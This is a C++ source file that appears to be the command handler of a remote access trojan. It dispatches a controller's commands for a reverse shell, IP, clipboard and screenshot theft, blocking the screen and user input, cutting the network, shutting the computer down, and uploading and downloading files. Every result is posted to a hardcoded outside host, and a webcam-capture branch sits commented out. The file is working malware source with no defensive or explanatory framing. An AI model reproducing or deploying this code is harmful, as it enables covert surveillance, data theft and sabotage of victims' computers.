#include <iostream>
#include <string>

#include "spy.hpp"
#include "troll.hpp"
#include "filesystem.hpp"
#include "other.hpp"

#include "extern/json.hpp"

#pragma once

std::string OUTPUTS_URL = "http://0x3af72.pythonanywhere.com/outputs/?u=";

void perform(std::string id, std::vector<std::string> values) {

    std::string type = values[1];

    if (type == "rshell") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", ReverseShell(values[2])}
        });
    }

    else if (type == "gip") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", GrabIP()}
        });
    }

    else if (type == "cboard") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", GrabClipboard()}
        });
    }

    else if (type == "ss") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", GrabScreenshot()}
        });
    }

    else if (type == "bscreen") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        BlockScreen(atoi(values[2].c_str()));
    }

    else if (type == "binput") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        BlockUserInput(atoi(values[2].c_str()));
    }

    else if (type == "offnet") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        KillInternet(atoi(values[2].c_str()));
    }

    else if (type == "killpc") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        KillComputer();
    }

    else if (type == "cd") {
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", ChangeDirectory(values[2]) ? "success" : "fail"}
        });
    }

    else if (type == "ls") {
        std::string data;
        for (std::string entry: ListDirectory()) {
            data += entry + "\n";
        }
        data = data.substr(0, data.size() - 1);
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", data}
        });
    }

    // else if (type == "webcam") {
    //     std::string base64;
    //     if (GetWebcamImage(&base64)) {
    //         POST_Request(OUTPUTS_URL + id, {
    //             {"instruction_id", values[0]},
    //             {"type", "webcam"},
    //             {"data", base64}
    //         });
    //     } else {
    //         POST_Request(OUTPUTS_URL + id, {
    //             {"instruction_id", values[0]},
    //             {"type", "webcam_fail"},
    //             {"data", "webcam unsuccessful"}
    //         });
    //     }
    // }

    else if (type == "download") {
        std::string fileID = DownloadFile(values[2]);
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", fileID}
        });
    }

    else if (type == "upload") {
        UploadFile(values[2], values[3]);
        POST_Request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
    }
}